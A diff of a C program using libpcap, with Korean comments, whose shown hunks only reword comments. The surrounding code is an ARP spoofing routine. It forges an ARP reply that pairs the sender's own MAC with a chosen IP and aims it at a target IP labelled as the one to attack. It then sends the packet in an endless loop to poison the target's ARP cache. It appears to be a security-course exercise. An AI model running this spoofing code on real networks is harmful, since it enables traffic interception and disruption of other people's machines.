@@ -202,10 +202,10 @@ int main(int argc, char* argv[]) {
 
             for(int i=0; i<6; i++){
                 rep.eth.dst[i] = tar_mac[i];
-            }	//tar_mac을 arp.eth.dst에 넣음
+            }	//tar_mac을 rep.eth.dst에 넣음
             for(int i=0; i<6; i++){
                 rep.eth.src[i] = my_mac[i];
-            }	//my_mac을 arp.eth.src에 넣음
+            }	//my_mac을 rep.eth.src에 넣음
             rep.eth.type = (u_int16_t)ntohs(0x0806);
                 //ethernet type이 0x0806 = ARP이다.
             rep.hard_type = (u_int16_t)ntohs(0x0001);
@@ -217,18 +217,18 @@ int main(int argc, char* argv[]) {
             rep.proc_len = (u_int8_t)0x04;
                 //네트워크 계층의 프로토콜 주소 크기 (IP 주소의 크기인 4 가 지정)
             rep.oper = (u_int16_t)ntohs(0x0002);
-                //Opcode = 2바이트 필드, ARP로 수행하는 작업의 종류 지정
+                //Opcode = 2바이트 필드, ARP로 수행하는 작업의 종류 지정 - 2이므로 arp reply
             for(int i=0; i<4; i++){
                 rep.sender_ip[i] = send_ip[i];
-            }	//보내고 싶은 ip를 arp.sender_ip에 넣음
+            }	//보내고 싶은 ip를 rep.sender_ip에 넣음
             for(int i=0; i<6; i++){
                 rep.sender_mac[i] = my_mac[i];
-            }	//my_mac을 arp.sender_mac에 넣음
+            }	//my_mac을 rep.sender_mac에 넣음
             memcpy((char*)rep.target_mac, tar_mac,6);
-                //tar_mac 6바이트를 arp.target_mac에 저장
+                //tar_mac 6바이트를 rep.target_mac에 저장
             for(int i=0; i<4; i++){
                 rep.target_ip[i] = tar_ip[i];
-            }	//공격할 ip를 arp.target_ip에 넣음
+            }	//공격할 ip를 rep.target_ip에 넣음
 
             printf("RECEIVE\n");
             printf("ARP REPLY-------------------------------\n");
@@ -247,7 +247,7 @@ int main(int argc, char* argv[]) {
             printf("Target IP \t: %u.%u.%u.%u\n", rep.target_ip[0],rep.target_ip[1],rep.target_ip[2],rep.target_ip[3]);
             printf("========================================\n");
             while(true){
-                pcap_sendpacket(handle,(u_char*)&rep, sizeof(rep));			//무한으로 패킷 보냄
+                pcap_sendpacket(handle,(u_char*)&rep, sizeof(rep));			//arp reply 패킷을 무한으로 보냄
             }
         }
         else{
